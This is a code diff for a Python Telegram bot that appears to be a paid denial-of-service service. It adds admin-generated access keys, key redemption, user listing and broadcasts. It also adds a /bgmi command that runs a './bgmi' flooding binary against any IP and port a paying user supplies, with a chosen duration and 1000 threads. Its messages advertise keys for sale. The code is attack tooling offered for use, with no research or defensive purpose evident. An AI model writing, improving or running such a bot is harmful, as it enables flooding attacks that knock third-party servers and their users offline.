@@ -1,19 +1,30 @@
 import subprocess
 import json
 import os
+import random
+import string
 import datetime
-import asyncio
-from telegram import Update, Chat
+import time
+from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME
 
 USER_FILE = "users.json"
-DEFAULT_THREADS = 1500
+KEY_FILE = "keys.json"
+
+flooding_process = None
+flooding_command = None
+
+DEFAULT_THREADS = 1000
 DEFAULT_PACKET = 9
-DEFAULT_DURATION = 180  # Set default duration (e.g., 60 seconds)
 
 users = {}
-user_processes = {}  # Dictionary to track processes for each user
+keys = {}
+
+def load_data():
+    global users, keys
+    users = load_users()
+    keys = load_keys()
 
 def load_users():
     try:
@@ -29,70 +40,176 @@ def save_users():
     with open(USER_FILE, "w") as file:
         json.dump(users, file)
 
-async def is_group_chat(update: Update) -> bool:
-    """Check if the chat is a group or supergroup."""
-    return update.message.chat.type in [Chat.GROUP, Chat.SUPERGROUP]
+def load_keys():
+    try:
+        with open(KEY_FILE, "r") as file:
+            return json.load(file)
+    except FileNotFoundError:
+        return {}
+    except Exception as e:
+        print(f"Error loading keys: {e}")
+        return {}
 
-async def private_chat_warning(update: Update) -> None:
-    """Send a warning if the bot is used in a private chat."""
-    await update.message.reply_text("This bot is not designed for private chats. Please use it in a Telegram group.")
+def save_keys():
+    with open(KEY_FILE, "w") as file:
+        json.dump(keys, file)
 
-async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    if not await is_group_chat(update):
-        await private_chat_warning(update)
-        return
+def generate_key(length=6):
+    characters = string.ascii_letters + string.digits
+    return ''.join(random.choice(characters) for _ in range(length))
 
-    global user_processes
+def add_time_to_current_date(hours=0, days=0):
+    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')
+
+# Command to generate keys
+async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user_id = str(update.message.from_user.id)
+    if user_id in ADMIN_IDS:
+        command = context.args
+        if len(command) == 2:
+            try:
+                time_amount = int(command[0])
+                time_unit = command[1].lower()
+                if time_unit == 'hours':
+                    expiration_date = add_time_to_current_date(hours=time_amount)
+                elif time_unit == 'days':
+                    expiration_date = add_time_to_current_date(days=time_amount)
+                else:
+                    raise ValueError("Invalid time unit")
+                key = generate_key()
+                keys[key] = expiration_date
+                save_keys()
+                response = f"Key generated: {key}\nExpires on: {expiration_date}"
+            except ValueError:
+                response = "Please specify a valid number and unit of time (hours/days) "
+        else:
+            response = "Usage: /genkey <amount> <hours/days>"
+    else:
+        response = "ONLY OWNER CAN USE💀OWNER @..."
+
+    await update.message.reply_text(response)
+
+
+async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user_id = str(update.message.from_user.id)
+    command = context.args
+    if len(command) == 1:
+        key = command[0]
+        if key in keys:
+            expiration_date = keys[key]
+            if user_id in users:
+                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
+                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
+                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
+            else:
+                users[user_id] = expiration_date
+            save_users()
+            del keys[key]
+            save_keys()
+            response = f"✅Key redeemed successfully! Access granted until: {users[user_id]} OWNER- @"
+        else:
+            response = "Invalid or expired key buy from @"
+    else:
+        response = "Usage: /redeem <key>"
+
+    await update.message.reply_text(response)
+
+
+async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user_id = str(update.message.from_user.id)
+    if user_id in ADMIN_IDS:
+        if users:
+            response = "Authorized Users:\n"
+            for user_id, expiration_date in users.items():
+                try:
+                    user_info = await context.bot.get_chat(int(user_id))
+                    username = user_info.username if user_info.username else f"UserID: {user_id}"
+                    response += f"- @{username} (ID: {user_id}) expires on {expiration_date}\n"
+                except Exception:
+                    response += f"- User ID: {user_id} expires on {expiration_date}\n"
+        else:
+            response = "No data found"
+    else:
+        response = "ONLY OWNER CAN USE."
+    await update.message.reply_text(response)
+
+
+async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    global flooding_command, flooding_process
     user_id = str(update.message.from_user.id)
 
-    if len(context.args) != 2:
-        await update.message.reply_text('Usage: /attack <target_ip> <port>')
+    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
+        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key. Buy key from @")
+        return
+
+    if len(context.args) != 4:
+        await update.message.reply_text('Usage: /bgmi <target_ip> <port> <duration> <sid>')
         return
 
     target_ip = context.args[0]
     port = context.args[1]
+    duration = int(context.args[2])  # Convert duration to an integer (seconds)
+    packet = context.args[3]
 
-    if user_id in user_processes and user_processes[user_id].poll() is None:
-        await update.message.reply_text("\u26a0\ufe0f An attack is already running. Please wait for it to finish.")
-        return
+    flooding_command = ['./bgmi', target_ip, port, str(duration), str(DEFAULT_PACKET), str(DEFAULT_THREADS)]
+    
+    # Start the flooding process
+    flooding_process = subprocess.Popen(flooding_command)
+    await update.message.reply_text(f'Flooding started: {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads.')
 
-    flooding_command = ['./bgmi', target_ip, port, str(DEFAULT_DURATION), str(DEFAULT_PACKET), str(DEFAULT_THREADS)]
-
-    # Start the flooding process for the user
-    process = subprocess.Popen(flooding_command)
-    user_processes[user_id] = process
-
-    await update.message.reply_text(f'Flooding started: {target_ip}:{port} for {DEFAULT_DURATION} seconds with {DEFAULT_THREADS} threads.')
-
-    # Wait for the specified duration asynchronously
-    await asyncio.sleep(DEFAULT_DURATION)
+    # Wait for the specified duration
+    time.sleep(duration)
 
     # Terminate the flooding process after the duration
-    process.terminate()
-    del user_processes[user_id]
+    flooding_process.terminate()
 
-    await update.message.reply_text(f'Flooding attack finished: {target_ip}:{port}. Attack ran for {DEFAULT_DURATION} seconds.')
+    await update.message.reply_text(f'Flooding attack finished: {target_ip}:{port}. Attack ran for {duration} seconds.')
+
+
+async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user_id = str(update.message.from_user.id)
+    if user_id in ADMIN_IDS:
+        message = ' '.join(context.args)
+        if not message:
+            await update.message.reply_text('Usage: /broadcast <message>')
+            return
+
+        for user in users.keys():
+            try:
+                await context.bot.send_message(chat_id=int(user), text=message)
+            except Exception as e:
+                print(f"Error sending message to {user}: {e}")
+        response = "Message sent to all users."
+    else:
+        response = "ONLY OWNER CAN USE."
+    
+    await update.message.reply_text(response)
+
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    if not await is_group_chat(update):
-        await private_chat_warning(update)
-        return
-
     response = (
-        f"Welcome to the Flooding Bot by @{OWNER_USERNAME}! Here are the available commands:\n\n"
+        "Welcome to the Flooding Bot by @{OWNER_USERNAME}..! Here are the available commands:\n\n"
+        "Admin Commands:\n"
+        "/genkey <amount> <hours/days> - Generate a key with a specified validity period.\n"
+        "/allusers - Show all authorized users.\n"
+        "/broadcast <message> - Broadcast a message to all authorized users.\n\n"
         "User Commands:\n"
-        "/attack <target_ip> <port> - Start a flooding attack with default time and threads.\n"
+        "/redeem <key> - Redeem a key to gain access.\n"
+        "/bgmi <target_ip> <port> <duration> - Set the flooding parameters and start attack.\n"
     )
     await update.message.reply_text(response)
 
 def main() -> None:
     application = ApplicationBuilder().token(BOT_TOKEN).build()
 
-    application.add_handler(CommandHandler("attack", attack))
+    application.add_handler(CommandHandler("genkey", genkey))
+    application.add_handler(CommandHandler("redeem", redeem))
+    application.add_handler(CommandHandler("allusers", allusers))
+    application.add_handler(CommandHandler("bgmi", bgmi))
+    application.add_handler(CommandHandler("broadcast", broadcast))
     application.add_handler(CommandHandler("help", help_command))
 
-    global users
-    users = load_users()
+    load_data()
     application.run_polling()
 
 if __name__ == '__main__':
